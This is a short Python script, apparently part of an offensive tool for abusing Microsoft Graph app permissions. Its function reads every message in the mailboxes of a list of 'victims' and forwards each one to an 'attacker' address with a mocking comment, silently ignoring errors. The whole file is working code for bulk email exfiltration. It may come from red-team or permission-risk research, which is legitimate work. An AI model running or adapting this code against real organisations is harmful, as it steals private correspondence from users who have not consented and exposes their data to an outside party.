import requests
import colorama
from colorama import Fore, Style


def mailSend_Vectors(request_headers, mailSendSettings):
    print()
    print(
        "mail.send - Allows the app to send mail as users in the organization.. ")

    print()
    try:
        print("Attack vector - read all mails.")
        for user in mailSendSettings["victims"]:
            create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user + "/messages/"
            result = requests.get(create_message_URL, headers=request_headers)
            if result.status_code == 200:
                json = result.json()
                values = json["value"]
                for value in values:

                    create_message_URL = "https://graph.microsoft.com/beta/users/" + user + "/messages/" + value["id"] + "/forward"
                    body = {
                        "message": {
                            "isDeliveryReceiptRequested": False,
                            "toRecipients": [
                                {
                                    "emailAddress": {
                                        "address": mailSendSettings["attacker"],
                                        "name": "attacker"
                                    }
                                }
                            ]
                        },
                        "comment": "Hi, christmas came earlier this year:)"
                    }
                    res = requests.post(create_message_URL, json=body, headers=request_headers)
                    if res.status_code == 202:
                        print(Fore.GREEN + "mail with subject " + value["subject"] + " sent.")

                        print(Style.RESET_ALL)

    except:
        pass
